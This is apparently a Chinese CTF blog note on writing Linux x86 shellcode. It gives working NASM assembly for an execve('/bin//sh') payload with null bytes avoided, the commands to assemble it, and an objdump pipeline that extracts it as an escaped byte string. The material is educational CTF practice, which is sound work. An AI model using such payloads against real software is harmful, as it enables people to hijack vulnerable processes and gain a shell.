---
title: shellcode编写
categories: 
	- ctf
	- shellcode
---
# 编写汇编代码

```nasm
section .text
    global _start

_start:
    xor eax,eax
    push eax
    push 0x68732f6e
    push 0x69622f2f
    mov ebx,esp
    mov al,0xb
    xor ecx,ecx
    xor edx,edx
    int 80h
```

注意：由于转换为shellcode如果出现00，则有可能被识别为终止符，所以需要避免出现。故将mov eax,0xb修改为mov al,0xb

# 编译汇编代码

```shell
nasm -f elf asm/exec.asm && ld -m elf_i386 -s -o exec asm/exec.o
```

# 导出shellcode

```shell
objdump -d ./exec|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
